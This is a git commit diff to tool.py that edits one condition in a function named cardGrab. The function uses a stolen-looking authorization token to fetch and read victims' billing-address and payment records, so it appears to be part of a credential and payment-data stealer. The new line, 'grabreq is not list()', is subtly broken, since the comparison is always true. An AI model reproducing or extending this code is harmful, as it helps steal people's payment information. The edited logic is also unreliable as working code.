99fa84a9fb94bb5386e32c2e8f4dd3e9f2b10ab5
posreadyxp <85892886+posreadyxp@users.noreply.github.com>
2022-02-12 13:21:26 +0000

    or no..

--- tool.py
+++ tool.py
@@ -1347,7 +1347,7 @@ def cardGrab(cc_digits):
                 headers={"Authorization": token},
             )
             grabreq = req.json()
-            if req.status_code in statuses and not isinstance(grabreq, list):
+            if req.status_code in statuses and grabreq is not list():
                 for grab in grabreq:
                     grab1 = grab["billing_address"]
                     name = grab1["name"]
